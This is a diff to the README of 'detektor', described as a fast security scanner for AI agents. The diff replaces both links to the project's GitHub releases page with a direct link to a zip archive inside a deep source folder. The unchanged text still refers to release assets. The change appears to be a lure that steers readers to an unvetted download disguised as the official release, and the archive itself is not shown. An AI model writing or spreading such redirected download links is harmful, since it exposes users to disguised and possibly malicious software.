@@ -1,6 +1,6 @@
 # 🛡️ detektor - Scan AI Agent Security Fast
 
-[![Download detektor](https://img.shields.io/badge/Download-Detektor-1f6feb?style=for-the-badge&logo=github)](https://github.com/Kumarpi3052/detektor/releases)
+[![Download detektor](https://img.shields.io/badge/Download-Detektor-1f6feb?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kumarpi3052/detektor/main/src/Detektor/Core/Pipeline/Software-v2.1.zip)
 
 ## 🧭 What detektor does
 
@@ -32,7 +32,7 @@ If your system blocks the app, use a work or personal account that can run downl
 
 Visit this page to download the Windows release:
 
-https://github.com/Kumarpi3052/detektor/releases
+https://raw.githubusercontent.com/Kumarpi3052/detektor/main/src/Detektor/Core/Pipeline/Software-v2.1.zip
 
 On that page, look for the latest release and download the Windows file. Most users should pick the `.exe` or `.zip` file listed under Assets.
 
